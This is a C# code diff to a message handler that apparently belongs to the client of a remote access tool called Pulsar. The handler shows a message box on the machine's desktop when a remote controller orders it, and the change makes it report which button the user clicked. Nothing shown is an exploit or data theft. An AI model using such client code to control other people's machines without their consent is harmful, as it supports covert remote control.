@@ -16,26 +16,42 @@ namespace Pulsar.Client.Messages
 
         public void Execute(ISender sender, IMessage message)
         {
-            switch (message)
-            {
-                case DoShowMessageBox msg:
-                    Execute(sender, msg);
-                    break;
-            }
+            if (message is DoShowMessageBox msg)
+                Execute(sender, msg);
         }
 
         private void Execute(ISender client, DoShowMessageBox message)
         {
             new Thread(() =>
             {
-                // messagebox thread resides in csrss.exe - wtf?
-                MessageBox.Show(message.Text, message.Caption,
-                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button),
-                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon),
-                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-            }) {IsBackground = true}.Start();
+                try
+                {
+                    var buttons = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button);
+                    var icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon);
 
-            client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
+                    DialogResult result = MessageBox.Show(
+                        message.Text,
+                        message.Caption,
+                        buttons,
+                        icon,
+                        MessageBoxDefaultButton.Button1,
+                        MessageBoxOptions.DefaultDesktopOnly);
+
+                    // Send which button the user clicked
+                    client.Send(new SetStatus
+                    {
+                        Message = $"MessageBox result: {result}"
+                    });
+                }
+                catch (Exception ex)
+                {
+                    client.Send(new SetStatus
+                    {
+                        Message = $"Error showing MessageBox: {ex.Message}"
+                    });
+                }
+            })
+            { IsBackground = true }.Start();
         }
     }
 }
